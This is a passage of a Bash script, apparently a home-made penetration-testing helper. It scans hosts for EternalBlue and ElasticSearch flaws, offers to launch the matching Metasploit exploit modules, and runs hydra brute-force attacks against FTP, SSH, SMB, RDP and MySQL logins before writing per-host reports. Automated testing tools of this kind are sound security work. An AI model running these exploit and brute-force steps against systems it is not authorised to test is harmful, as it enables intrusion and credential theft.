	test_elk_traversal=$(msfconsole -qx "use auxiliary/scanner/http/elasticsearch_traversal;set filepath /windows/system32/drivers/etc/hosts; set rhost ${IPX};run;exit" | grep "The target appears to be vulnerable.")
	if [ -n "$test_elk_traversal" ]; then exploit_found+=$(echo -e "\nElasticSearch (ELK) Vulnerability [CVE-2014-3120]:\texploit/multi/elasticsearch/script_mvel_rce");fi
	
	# Test Eternal Blue Exploit
	test_eternal_blue=$(nmap --script smb-vuln-ms17-010 -p445 $IPX | grep State: | awk '{print $NF}')
	if [ "$test_eternal_blue" == "VULNERABLE" ]; then exploit_found+=$(echo -e "\nEternal Blue Vulnerability [CVE-2017-0143]:\texploit/windows/smb/ms17_010_eternalblue");fi
	
	# Enumerate snmp users
	test_snmp_enumusers=$(nmap $IPX -p161 -sV | grep 161 | awk '{print $2}')
	if [ "$test_snmp_enumusers" == "open" ]; then exploit_found+=$(echo -e "\nEnumerate SNMP Users:\tauxiliary/scanner/snmp/snmp_enumusers");fi
	
	# Append a number to each possible enumeration modules
	echo -e "\e[1;32m\nPossible Enumeration Module(s) (Metasploit): $(echo "$exploit_found" | grep ^[0-9] | wc -l)\n[${IPX}]\e[0m" > ./vulner/${IPX}/${IPX}_exploit
	number=1
	exploit_result=""
	while read line
	do
		exploit_result+=$(echo -e "${number}) $line")$'\n' 
		((number++))
	done < <((echo "$exploit_found" | column -s $'\t' -t))
	if [ -n "$exploit_result" ];then	
		echo -e "$exploit_result" | sed '/^$/d' | column -s $'\t' -t >> ./vulner/${IPX}/${IPX}_exploit
		echo -e "$(date "+%T %p") [$IPX] Searching possible enumeration module(s) completed." | tee -a /tmp/vuln/local.net
	else
		echo -e "\n\033[1m   Unable to find possible exploit on this device.\033[0m" >> ./vulner/${IPX}/${IPX}_exploit
		echo -e "$(date "+%T %p") [$IPX] Searching possible enumeration module(s) completed." | tee -a /tmp/vuln/local.net
	fi
}
function enum_exploit(){ 			# Enumerate the possible modules
	IPX="$1"
	clear
	cat ./vulner/${IPX}/${IPX}_exploit | column -s $'\t' -t
	if [ $(cat ./vulner/${IPX}/${IPX}_exploit | grep ^[0-9] | wc -l) == 0 ];then
		echo -e "   Press 'Enter' to continue.\033[0m";echo ""; read -r
		return 0
	else
		# Send the parameters needed to run Metasploit
		echo -e "\nNote: If the enumerate attempt failed; try changing the \"LPORT\" or the \"PAYLOAD\"; and try again.\n"
		
		while true;do
			echo -ne "\033[1m    Choose your module (To go back, enter 'b'. To quit, enter 'q'.)\033[0m: " && read choice 
			if [[ $choice =~ ^(1[0-9]|[1-9])$ ]] && (( $choice <= $(cat ./vulner/${IPX}/${IPX}_exploit | grep ^[0-9] | wc -l)));then
				exploit_parameters=$(cat ./vulner/${IPX}/${IPX}_exploit | grep -w "^$choice" | cut -d " " -f2-)
				meta_sploit "$exploit_parameters"		# run metasploit
				end_stamp "$IPX"						# update the end date and time of report
			elif [[ "$choice" = "b" ]] || [[ "$choice" = "B" ]];then
				break
			elif [[ "$choice" = "q" ]] || [[ "$choice" = "Q" ]];then
				trap_all
			fi
		done
	fi
}
function weak_passwords_check(){	# Weak Passwords Checker using Brute-force
	# Setting parameters for Brute-force
	IPX="$1"
	service="$2"
	service_login=$(echo "$service" | sed s'/postgresql/postgres/g' | sed s'/netbios-ssn/smb/g')
	port="$3"
	username_path="$4"
	password_path="$5"

	# Header for Weak Passwords Check complete=1 is for after scan options
	if [ $complete == 1 ];then
		echo -e "\n\e[1;32mWeak Passwords Check [manual]: \n[$IPX]\e[0m" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
		echo -e "\033[1mDate\033[0m: $(date "+%d %B %Y")" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
		echo -e "\033[1mTime\033[0m: $(date "+%T %p")" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
		echo -e "\033[1mPort\033[0m: $port \n\033[1mService\033[0m: $service_login" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
		echo -e "   Username List: $username_path" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
		echo -e "   Password List: $password_path" | tee -a ./vulner/${IPX}/${IPX}_wpc ./vulner/${IPX}/${IPX}_report >/dev/null
	elif [ $complete == 0 ];then
		echo -e "\n\e[1;32mWeak Passwords Check [auto]: \n[$IPX]\e[0m" > ./vulner/${IPX}/${IPX}_wpc
		echo -e "\033[1mDate\033[0m: $(date "+%d %B %Y")" >> ./vulner/${IPX}/${IPX}_wpc
		echo -e "\033[1mTime\033[0m: $(date "+%T %p")" >> ./vulner/${IPX}/${IPX}_wpc
		echo -e "\033[1mPort\033[0m: $port \n\033[1mService\033[0m: $service_login" >> ./vulner/${IPX}/${IPX}_wpc 
		echo -e "   Username List: $username_path" >> ./vulner/${IPX}/${IPX}_wpc
		echo -e "   Password List: $password_path" >> ./vulner/${IPX}/${IPX}_wpc
	fi
	# Commence Weak Passwords Check
	echo -ne " Weak Passwords Check $IPX Port:$port ($service_login). \e[5m*Please wait.*\r\e[25m"
	if [ $complete == 1 ];then	
		gnome-terminal --tab --title "Port:$port ($service_login)" --wait -- bash -c "echo $pass | sudo -S hydra $IPX -L $username_path -P $password_path $service_login -s $port -t3 -I -e nsr -vV | tee /tmp/vuln/${IPX}_wpc_unfiltered 2>/dev/null; read bash" 
	else 
		echo $pass | sudo -S hydra $IPX -L $username_path -P $password_path $service_login -s $port -t3 -I -e nsr -vV > /tmp/vuln/${IPX}_wpc_unfiltered 2>/dev/null
	fi
	
	if [ -n "$(cat /tmp/vuln/${IPX}_wpc_unfiltered | grep -w 'host')" ];then
		# Weak passwords found
		cat /tmp/vuln/${IPX}_wpc_unfiltered | grep -w 'host' >> ./vulner/${IPX}/${IPX}_wpc
		# For after-option Weak Password Check (manual)
		if [ $complete == 1 ];then clear && cat /tmp/vuln/wpc_screen; gnome-terminal --tab --title "${IPX}_wpc" --wait -- bash -c "cat ./vulner/${IPX}/${IPX}_wpc;read bash"; echo "" ;end_stamp "$IPX"
			cat /tmp/vuln/${IPX}_wpc_unfiltered | grep -w 'host' >> ./vulner/${IPX}/${IPX}_report
		fi
		echo -e "$(date "+%T %p") [$IPX] Port:$port ($service_login) Weak Passwords Check completed." | tee -a /tmp/vuln/local.net

	else
		# Weak passwords not found
		echo "BRUTE-FORCE UNSUCCESSFUL." >> ./vulner/${IPX}/${IPX}_wpc
		# For after-option Weak Password Check (manual)
		if [ $complete == 1 ];then clear && cat /tmp/vuln/wpc_screen; gnome-terminal --tab --title "${IPX}_wpc" --wait -- bash -c "cat ./vulner/${IPX}/${IPX}_wpc;read bash"; echo "" ;end_stamp "$IPX"
			echo "BRUTE-FORCE UNSUCCESSFUL." >> ./vulner/${IPX}/${IPX}_report
		fi	
		echo -e "$(date "+%T %p") [$IPX] Port:$port ($service_login) Weak Passwords Check completed." | tee -a /tmp/vuln/local.net
	fi
}
function after_options(){			# Set options for user to do futher enumeration on available devices
	option_list="  [1] View Report\n   [2] Weak Passwords Check\n   [3] Enumerate Possible Known Exploits"
	while true; do
		# Display completed scan of devices
		clear
		cat /tmp/vuln/local.net | sed '${/^$/d;}' && echo ""
		cat /tmp/vuln/local.net2 && echo ""
		echo -ne "\033[1m   Choose your option\033[0m: " && read choose
		
		# Validate the input for IP address
		if [[ $choose =~ ^([1-9]|1[0-9])$ ]] && (( $choose <= $(cat /tmp/vuln/local.net2 | grep -v '^$'| wc -l) ));then
			while true;do	
				# Display the options to View Result | Weak Passwords Check | Enumerate Exploits
				clear && cat /tmp/vuln/local.net | sed '${/^$/d;}' | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' && echo ""
				choice1=$(cat /tmp/vuln/local.net2 | grep -w "^${choose}")
				choice1_ip=$(cat /tmp/vuln/local.net2 | grep -w "^${choose}" | awk '{print $2}')
				effect1=$(cat /tmp/vuln/local.net2 | grep $choice1_ip | sed -n "/$choice1/{s/^/\x1b[1m\x1b[36m/;s/$/\x1b[0m/;p;q}")
				cat /tmp/vuln/local.net2 | sed "s/$choice1/$effect1/g" | sed "$choose a\ $option_list" | grep -A 3 "$choice1" | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' && echo ""
				echo -ne "\033[1m   Choose your option (To go back, enter 'b'. To quit, enter 'q')\033[0m: " && read next_choose
				case $next_choose in
					1) # View Report
					clear && cat /tmp/vuln/local.net | sed '${/^$/d;}' && echo ""
					effect2=$(cat /tmp/vuln/local.net2 | sed "s/$choice1/$effect1/g" | sed "$choose a\ $option_list" | sed -n "/\[1\] View Report/{s/^/\x1b[1m\x1b[36m/;s/$/\x1b[0m/;p;q}" | sed 's/   //')
					cat /tmp/vuln/local.net2  | sed "s/$choice1/$effect1/g" | sed "$choose a\ $option_list" | sed "s/\[1\] View Report/$effect2/" | grep -A 3 "$choice1_ip" | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g'
					if [ -e ./vulner/${choice1_ip}/${choice1_ip}_report ];then
						gnome-terminal --tab --title "Report of ${choice1_ip}" -- bash -c "cat ./vulner/${choice1_ip}/${choice1_ip}_report; read bash"
					else
						echo -e "\033[1m\n\tReport not yet available.\033[0m"
					fi ;;
					
					2) # Weak Passwords Check on other services available
					clear
					echo -e "\033[1m\033[4m\033[33mWeak Passwords Check [$choice1_ip]\033[0m" > /tmp/vuln/wpc_screen
					echo -e "\033[1mBrute-force list selected\033[0m:" >> /tmp/vuln/wpc_screen
					echo -e "   Username List: \"$username_path\"" >> /tmp/vuln/wpc_screen
					echo -e "   Password List: \"$password_path\"\n" >> /tmp/vuln/wpc_screen
					
					echo -e "\033[1mPorts and Service Login available\033[0m:" >> /tmp/vuln/wpc_screen
					grep "^PORT" vulner/${choice1_ip}/${choice1_ip}_vulnscan | sed 's/^/   /'  >> /tmp/vuln/wpc_screen
					wpc_choice=$(cat vulner/${choice1_ip}/${choice1_ip}_vulnscan | grep -w open | grep ^[0-9] | grep -ie ftp -ie ssh -ie telnet -ie posgres -ie samba -ie smbd -ie rdp -ie mysql)
					
					# Check if Service Login is available
					if [ $(echo "$wpc_choice" | sed '/^$/d' | wc -l) == 0 ];then cat /tmp/vuln/wpc_screen && echo ""; echo -e "\n\033[1m   No Service Login available on this device.\n   Press 'Enter' to continue.\033[0m";echo ""; read -r;break
					else
						# Append a number at the beginning of each options available
						counter=1
						choice2=""
						while read line1
						do
							choice2+=$(echo -e "$counter) $line1")$'\n'
							((counter++))
						done < <(echo "$wpc_choice")
						choice2+=$(echo -e "$counter) Specify a different Username List.")$'\n' && ((counter++))
						choice2+=$(echo -e "$counter) Specify a different Password List.")$'\n'  && ((counter++))
						choice2+=$(echo -e "$counter) Create a new Username List.")$'\n' && ((counter++))
						choice2+=$(echo -e "$counter) Create a new Password List.") && ((counter++))
						echo "$choice2" | sed '/^$/d' >> /tmp/vuln/wpc_screen
						cat /tmp/vuln/wpc_screen && echo ""

						# Navigate to selected choice
						while true; do
							echo -ne "\033[1m   Choose your option (To go back, enter 'b'. To quit, enter 'q')\033[0m: " && read choose3
							get_svc_port=$(echo "$choice2" | grep -w ^$choose3)
							# if Port and Service selected, commence Weak Passwords Check
							if [[ $choose3 =~ ^(1[0-9]|[1-9])$ ]] && (( $choose3 <= $(echo "$wpc_choice" | sed '/^$/d' | wc -l) ));then
								service=$(echo $get_svc_port | awk '{print $4}')
								port=$(echo $get_svc_port | awk -F/ '{print $1}' | awk '{print $2}')
								echo ""
								weak_passwords_check "$choice1_ip" "$service" "$port" "$username_path" "$password_path"
								echo -e "\033[1m\nResult added to ./vulner/${choice1_ip}/${choice1_ip}_wpc\033[0m\n"
								
							# if Username and Password selected, navigate to the related Function()
							elif [ "$choose3" == "b" ] || [ "$choose3" == "B" ];then
								break
							elif [ "$choose3" == "q" ] || [ "$choose3" == "Q" ];then
								echo "Quit"
							else
								case $get_svc_port in
									*different*Username*) # Specify a different Username List
										while true;do
											clear && cat /tmp/vuln/wpc_screen
											highlight "wpc_screen" "different.*Username"
											file_name=""
											echo -ne "\033[1m      Specify the filename of Username List.\033[0m\n      To use default [pass.lst], press 'Enter'. To go back, enter 'b'.: " && read file_name
											if [ -z "$file_name" ]; then file_selection "U" "wpc_screen" "different.*Username";elif [ "$file_name" == "b" ];then clear && cat /tmp/vuln/wpc_screen && echo "" ;break;else file_selection "U" "wpc_screen" "different.*Username" "$file_name";fi
											if [ $? == 0 ];then break;fi
										done 
										;;
									*different*Password*) # Specify a different Password List
										while true;do
											clear && cat /tmp/vuln/wpc_screen
											highlight "wpc_screen" "different.*Password"
											file_name=""
											echo -ne "\033[1m      Specify the filename of Username List.\033[0m\n      To use default [pass.lst], press 'Enter'. To go back, enter 'b'.: " && read file_name
											if [ -z "$file_name" ]; then file_selection "P" "wpc_screen" "different.*Password";elif [ "$file_name" == "b" ];then clear && cat /tmp/vuln/wpc_screen && echo "" ;break;else file_selection "P" "wpc_screen" "different.*Password" "$file_name";fi
											if [ $? == 0 ];then break;fi
										done 
										;;
									*new*Username*) # Create a list of Usernames
										create_list "usernames" "wpc_screen" "new.*Username" ;;
									*new*Password*) # Create a list of Passwords
										create_list "passwords" "wpc_screen" "new.*Password" ;;
									*) continue;;
								esac
							fi
						done
					fi ;;
					
					3) # To allow enumeration of Possible Known Exploits Modules
						enum_exploit "$choice1_ip" ;;
					b|B) break;;
					q|Q) # Quit Program
						trap_all;;
					*) continue;;

				esac
			done
		fi
	done
}
function report(){					# Compile the Report
	IPX="$1"
	echo -e "\e[1mEnd Date:\e[0m $(date "+%d %B %Y")" >> /tmp/vuln/period.log
	echo -e "\e[1mEnd Time:\e[0m $(date "+%T %p")\n" >> /tmp/vuln/period.log
	cat /tmp/vuln/period.log > ./vulner/${IPX}/${IPX}_report
	cat /tmp/vuln/local.net >> ./vulner/${IPX}/${IPX}_report
	cat /tmp/vuln/${IPX}_start >> ./vulner/${IPX}/${IPX}_report
	echo "" >> ./vulner/${IPX}/${IPX}_report
	cat ./vulner/${IPX}/${IPX}_vulnscan | grep -e ^PORT -e ^[0-9] -e ^Warning >> ./vulner/${IPX}/${IPX}_report
	cat /tmp/vuln/${IPX}_edited >> ./vulner/${IPX}/${IPX}_report
	cat ./vulner/${IPX}/${IPX}_exploit >> ./vulner/${IPX}/${IPX}_report
	cat ./vulner/${IPX}/${IPX}_wpc >> ./vulner/${IPX}/${IPX}_report
	# indicate end of scan
	if [ "$IPX" == $(echo "$ip_list" | tail -n 1) ];then
		declare -g complete=1	
	fi
}
function end_stamp(){ 				# Update the end date & time of Report
	IPX="$1"
	end_date=$(echo -e "\e[1mEnd Date:\e[0m $(date "+%d %B %Y")")
	end_time=$(echo -e "\e[1mEnd Time:\e[0m $(date "+%T %p")")
	sed -i "6s#.*#$end_date#" ./vulner/${IPX}/${IPX}_report
	sed -i "7s#.*#$end_time#" ./vulner/${IPX}/${IPX}_report
}
complete=0
bin_check
setup
after_options

